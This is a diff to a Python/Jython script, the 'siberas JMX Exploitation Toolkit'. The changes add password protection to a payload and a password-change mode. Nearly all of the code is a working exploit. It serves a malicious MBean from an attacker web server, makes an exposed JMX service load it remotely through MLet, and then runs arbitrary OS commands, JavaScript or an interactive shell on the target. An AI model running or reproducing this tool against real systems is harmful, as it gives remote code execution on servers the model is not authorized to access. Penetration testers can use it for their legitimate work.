@@ -18,7 +18,9 @@ import jarray
 import argparse
 import base64
 
-authorSignature = '[+] sjet was brought to you by siberas :)    '
+authorSignature =  'sJET - siberas JMX Exploitation Toolkit\n'
+authorSignature += '======================================='
+
 
 ### AUX ###
 def connectToJMX(args):
@@ -34,12 +36,11 @@ def connectToJMX(args):
 ### INSTALL MODE ###
 
 def installMode(args):
-    full_mlet_url = args.payload_url + ":" + args.payload_port
-    startWebserver(args, full_mlet_url)
+    startWebserver(args)
     bean_server = connectToJMX(args)
-    installMBeans(args, bean_server, full_mlet_url)
+    installMBeans(args, bean_server)
 
-def installMBeans(args, bean_server, full_mlet_url):
+def installMBeans(args, bean_server):
     # Installation, load javax.management.loading.MLet to install additional MBeans
     # If loading fails, the Mlet is already loaded...
     try:
@@ -53,12 +54,12 @@ def installMBeans(args, bean_server, full_mlet_url):
 
     # Install payload Mlet via getMbeansFromURL
     # pass the URL of the web server
-    print "[+] Loading malicious MBean from " + full_mlet_url
+    print "[+] Loading malicious MBean from " + args.payload_url
     print "[+] Invoking: "+ mlet_bean.getClassName() + ".getMBeansFromURL"
 
 
     inv_array1 = jarray.zeros(1, Object)
-    inv_array1[0] = full_mlet_url
+    inv_array1[0] = args.payload_url
 
     inv_array2 = jarray.zeros(1, String)
     inv_array2[0] = String.canonicalName
@@ -66,17 +67,24 @@ def installMBeans(args, bean_server, full_mlet_url):
     resource = bean_server.invoke(mlet_bean.getObjectName(), "getMBeansFromURL", inv_array1, inv_array2)
 
     # Check if the Mlet was loaded successfully
+
     for res in resource:
         if res.__class__.__name__ == "InstanceAlreadyExistsException":
             print "[+] Object instance already existed, no need to install it a second time"
         elif res.__class__.__name__ == "ObjectInstance":
-            print "[+] Successfully loaded " + str(res.getObjectName())
+            print "[+] Successfully loaded MBean" + str(res.getObjectName())
 
-def startWebserver(args, full_mlet_url):
+            # Change the password from "I+n33d+a+glass+0f+watta" to the new value
+            print "[+] Changing default password..."
+            changePassword("I+n33d+a+glass+0f+watta", args.password, bean_server)
+
+
+
+def startWebserver(args):
     # Start a web server on all ports in a seperate thread
     # Only needed during installation
     print "[+] Starting webserver at port " + str(args.payload_port)
-    mletHandler = MakeHandlerClass(full_mlet_url)
+    mletHandler = MakeHandlerClass(args.payload_url)
     mlet_webserver = HTTPServer(('', int(args.payload_port)), mletHandler)
     webserver_thread = Thread(target = mlet_webserver.serve_forever)
     webserver_thread.daemon = True
@@ -127,23 +135,61 @@ def MakeHandlerClass(base_url):
 
 ### COMMAND MODE ###
 
-def commandMode(args):
+def changePasswordMode(args):
     bean_server = connectToJMX(args)
-    executeCommand(args.cmd, bean_server)
+    changePassword(args.password, args.newpass, bean_server)
     print "[+] Done"
 
-def executeCommand(cmd, bean_server):
+def changePassword(password, newpass, bean_server):
+    # Payload execution
+    # Load the Payload Met and invoke a method on it
+    mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
+    print "[+] Loaded " + str(mlet_bean.getClassName())
+
+    inv_array1 = jarray.zeros(2, Object)
+    inv_array1[0] = password
+    inv_array1[1] = newpass
+
+    inv_array2 = jarray.zeros(2, String)
+    inv_array2[0] = String.canonicalName
+    inv_array2[1] = String.canonicalName
+
+    resource = bean_server.invoke(mlet_bean.getObjectName(), "changePassword", inv_array1, inv_array2)
+
+    if str(resource) == "True":
+        print "[+] Sucessfully changed password"
+    else:
+        print "[-] Unable to change password"
+
+
+    sys.stdout.write("\n")
+    sys.stdout.flush()
+
+### /COMMAND MODE ###
+
+
+### COMMAND MODE ###
+
+def commandMode(args):
+    bean_server = connectToJMX(args)
+    executeCommand(args.password, args.cmd, bean_server)
+    print "[+] Done"
+
+def executeCommand(password, cmd, bean_server):
     # Payload execution
     # Load the Payload Met and invoke a method on it
     mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
     print "[+] Loaded " + str(mlet_bean.getClassName())
 
     print "[+] Executing command: " + cmd
-    inv_array1 = jarray.zeros(1, Object)
-    inv_array1[0] = cmd
+    inv_array1 = jarray.zeros(2, Object)
+    inv_array1[0] = password
+    inv_array1[1] = cmd
 
-    inv_array2 = jarray.zeros(1, String)
+
+    inv_array2 = jarray.zeros(2, String)
     inv_array2[0] = String.canonicalName
+    inv_array2[1] = String.canonicalName
 
     resource = bean_server.invoke(mlet_bean.getObjectName(), "runCMD", inv_array1, inv_array2)
 
@@ -160,27 +206,30 @@ def scriptMode(args):
     bean_server = connectToJMX(args)
 
     with open(args.filename, 'r') as myfile:
-        script=myfile.read().replace('\n', ' ')
+        script=myfile.read()
 
-    executeJS(script, bean_server)
+    executeJS(args.password, script, bean_server)
 
 
-def executeJS(js, bean_server):
+def executeJS(password, js, bean_server):
     # Payload execution
     # Load the Payload Met and invoke a method on it
     mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
     print "[+] Loaded " + str(mlet_bean.getClassName())
 
     print "[+] Executing script"
-    inv_array1 = jarray.zeros(1, Object)
-    inv_array1[0] = js
+    inv_array1 = jarray.zeros(2, Object)
+    inv_array1[0] = password
+    inv_array1[1] = js
 
-    inv_array2 = jarray.zeros(1, String)
+    inv_array2 = jarray.zeros(2, String)
     inv_array2[0] = String.canonicalName
+    inv_array2[1] = String.canonicalName
 
     resource = bean_server.invoke(mlet_bean.getObjectName(), "runJS", inv_array1, inv_array2)
 
-    print resource
+    if resource is not None:
+        print resource
 
     sys.stdout.write("\n")
     sys.stdout.flush()
@@ -192,10 +241,10 @@ def executeJS(js, bean_server):
 
 def shellMode(args):
     bean_server = connectToJMX(args)
-    startShell(bean_server)
+    startShell(args.password, bean_server)
     print "[+] Done"
 
-def startShell(bean_server):
+def startShell(password, bean_server):
     print "[+] Use command 'exit_shell' to exit the shell"
     in_command_loop = True
     while in_command_loop:
@@ -203,8 +252,8 @@ def startShell(bean_server):
         if cmd == 'exit_shell':
             in_command_loop = False
         else:
-            executeCommand(cmd, bean_server)
-     
+            executeCommand(password, cmd, bean_server)
+
 ### /SHELL MODE ###
 
 
@@ -223,12 +272,16 @@ def arg_script_mode(args):
 def arg_shell_mode(args):
     print authorSignature
     shellMode(args)
+def arg_password_mode(args):
+    print authorSignature
+    changePasswordMode(args)
+
 
 # Base parser
 parser = argparse.ArgumentParser(description = 'description', epilog='By siberas', add_help=True)
 parser.add_argument('targetHost', help='target IP address')
-parser.add_argument('targetPort', help='target JMX port')
-
+parser.add_argument('targetPort', help='target JMX service port')
+parser.add_argument('password', help="the password to execute the payload")
 subparsers = parser.add_subparsers(title='modes', description='valid modes', help='use ... MODE -h for help about specific modes')
 
 # Install mode
@@ -236,6 +289,11 @@ install_subparser = subparsers.add_parser('install', help='install the payload o
 install_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
 install_subparser.add_argument('payload_port', help='port to load the payload')
 install_subparser.set_defaults(func=arg_install_mode)
+
+# Password mode
+install_subparser = subparsers.add_parser('password', help='change the payload password on the target')
+install_subparser.add_argument('newpass', help='The new password')
+install_subparser.set_defaults(func=arg_password_mode)
 
 # Command mode
 command_subparser = subparsers.add_parser('command', help='execute a command in the target')
